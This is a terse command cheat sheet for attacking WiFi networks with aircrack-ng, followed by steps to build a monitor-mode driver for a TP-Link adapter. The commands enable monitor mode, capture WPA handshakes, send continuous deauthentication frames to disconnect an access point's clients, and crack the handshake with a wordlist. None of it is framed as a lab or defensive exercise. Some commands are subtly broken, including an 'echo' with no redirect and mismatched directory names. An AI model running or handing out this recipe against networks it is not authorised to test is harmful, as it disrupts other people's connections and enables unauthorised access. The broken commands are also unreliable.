__Set WiFi Adapter to monitor mode__
```
sudo iwconfig <interface> mode monitor
```
or
```sh
sudo ip link set wlxb0a7b95826be down
sudo iw wlxb0a7b95826be set monitor control
sudo ip link set wlxb0a7b95826be up
```
__Start monitoring with airodump-ng__
```
sudo airodump-ng wlxb0a7b95826be
```

__Listen for WiFi handshake__
``` 
airodump-ng -c <channel> --bssid <access point MAC> -w <file-name> wlxb0a7b95826be
``` 

__Change interface channel__
```
iwconfig wlxb0a7b95826be channel <channel-id>
````

__Deauth the access point clients__
```
aireplay-ng --deauth 0 -a <bssid> wlxb0a7b95826be
```

__Crack captured handshake__
```
aircrack-ng -w <word-list> <captured file>
```

---
### Enable monitor mode on TP-link TL-WN22N

```sh
# sudo apt install build-essential libelf-dev linux-headers-`uname -r` dkms
# sudo rmmod r8188eu.ko
# git clone https://github.com/aircrack-ng/rtl8188eus
# cd rt8188eus
# sudo -i
# echo "blacklist r8188eus" "/etc/modprobe.d/realtek.conf"
# reboot
# sudo apt update
# cd rt8188eus
# sudo make
# sudo make install
# sudo modprobe 8188eu
```